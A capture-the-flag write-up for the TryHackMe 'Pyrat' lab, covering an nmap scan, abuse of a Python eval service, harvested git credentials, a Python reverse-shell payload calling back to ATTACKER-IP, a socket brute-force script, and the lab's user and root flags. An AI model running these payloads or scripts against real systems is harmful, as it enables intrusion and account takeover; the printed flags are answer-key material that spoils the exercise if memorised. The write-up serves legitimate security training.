# 🏴 Pyrat — TryHackMe Write-Up

## 📌 General Notes
- Always use **Incognito Mode** when accessing TryHackMe machines
- Browser cache may cause unexpected behavior
- Maintain proper `/etc/hosts` entries if required
- Focus on understanding **tool logic and service behavior**
- Keep reports structured and readable

---

## 🔍 Enumeration

### 🔎 Nmap Scan

Command used:
```bash
nmap -sC -sV -oN scan.txt <target-ip>
```
result:

# Nmap 7.95 scan initiated Sun Dec 14 02:41:59 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -oN scan.txt <machine-ip>
Nmap scan report for <machine-ip>
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 cc:8a:2f:39:d3:7c:f3:8a:f4:49:18:43:eb:81:4e:a6 (RSA)
|   256 96:cf:ac:cf:64:14:02:25:e9:1c:f1:4d:93:f7:1b:96 (ECDSA)
|_  256 e7:77:4b:4e:cb:03:53:bb:f9:b9:88:6f:76:5e:84:d9 (ED25519)
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-open-proxy: Proxy might be redirecting requests
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, LANDesk-RC, NotesRPC, Socks4, X11Probe, afp, giop: 
|     source code string cannot contain null bytes
|   FourOhFourRequest, LPDString, SIPOptions: 
|     invalid syntax (<string>, line 1)
|   GetRequest: 
|     name 'GET' is not defined
|   HTTPOptions, RTSPRequest: 
|     name 'OPTIONS' is not defined
|   Help: 
|_    name 'HELP' is not defined
|_http-server-header: SimpleHTTP/0.6 Python/3.11.2
Key findings:
```
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu
8000/tcp open  http     SimpleHTTP/0.6 Python/3.11.2
```

### 🧠 Analysis
- **SSH (22)** → Standard OpenSSH service, requires valid credentials
- **Port 8000** → Python-based HTTP service behaving abnormally
- HTTP methods returned Python errors, indicating direct code evaluation
- Port 8000 identified as the primary attack surface

---

## 🌐 Service Enumeration (Port 8000)

```bash
nc <target-ip> 8000
```

The service accepted raw Python input.

```python
print(os.listdir("/root"))          # Permission denied
print(os.listdir("/opt/dev/.git/")) # Accessible
```

---

## 🔑 Credential Discovery

```ini
[credential "https://github.com"]
    username = think
    password = _TH1NKINGPirate$_
```

---

## 🐚 Reverse Shell

Listener:
```bash
nc -lvnp 4000
```

Payload:
```bash
echo 'import socket,os,pty;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("ATTACKER-IP",4000));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
pty.spawn("sh")' | nc <target-ip> 8000
```

---

## 👤 User Access

```bash
ssh think@<target-ip>
```

User flag:
```
996bdb1f619a68361417cabca5454705
```

---

## 🔎 Privilege Escalation

```bash
ps aux | grep root
```

Found:
```
python3 /root/pyrat.py
```

---

## 🔐 Brute Force (Custom Script)

```bash
python newscript.py <target-ip> 8000 wordlist.txt
```

Credentials:
```
admin : abc123
```

---

## 🏁 Root Flag

```python
print(open('/root/root.txt').read())
```
```script:

import socket
import sys
from pathlib import Path
import time

def args_check():
    """Check for valid command line arguments."""
    if len(sys.argv) != 4:
        print("Usage: python newscript.py IP PORT WORDLIST")
        sys.exit(1)
    return sys.argv[1], int(sys.argv[2]), sys.argv[3]

def create_socket(ip, port):
    """Create and connect a TCP socket to the specified IP and port."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((ip, port))
    except socket.error:
        try:
            ip = socket.gethostbyname(ip)
            sock.connect((ip, port))
        except socket.error:
            print(f"Connection refused for {ip}:{port}")
            sys.exit(1)
    return sock

def send_data(sock, message):
    """Send a message to the server and receive the response."""
    sock.sendall((message + '\n').encode("utf-8"))
    return sock.recv(1024).decode("utf-8")

def check_file_exists(wordlist):
    """Check if the specified wordlist file exists."""
    file_path = Path(wordlist)
    if not file_path.exists():
        print(f"The file {file_path} does not exist.")
        sys.exit(1)

def bruteforce(ip, port, wordlist):
    """Attempt to brute-force the password using the provided wordlist."""
    print(f"Brute force started...")
    with open(wordlist, "r") as f:
        for password in f:
            password = password.strip()  # Remove any trailing newline characters
            sock = create_socket(ip, port)
            send_data(sock, 'admin')
            response = send_data(sock, password)
            if "Password" not in response:
                print(f"Response for correct password: \"{response.strip()}\"")
                print(f"Password found: {password}")
                endtime=time.time()
                print(f"timetaken: {round((endtime - starttime),3)} secs")
                return
        print("No valid passwords found.")

if __name__ == "__main__":
    starttime =time.time()
    # Get the command line arguments: IP, PORT, and WORDLIST
    ip, port, wordlist = args_check()
    # Check if the wordlist file exists
    check_file_exists(wordlist)
    # Start the brute-force process
    bruteforce(ip, port, wordlist)

```
ba5ed03e9e74bb98054438480165e221
```
---
```
## 🏆 Flags Summary

| Type | Value                            |
|------|----------------------------------|
| User | 996bdb1f619a68361417cabca5454705 |
| Root | ba5ed03e9e74bb98054438480165e221 |

---

## 🛠 Tools Used
- Nmap
- Netcat
- SSH
- Python
- LinPEAS
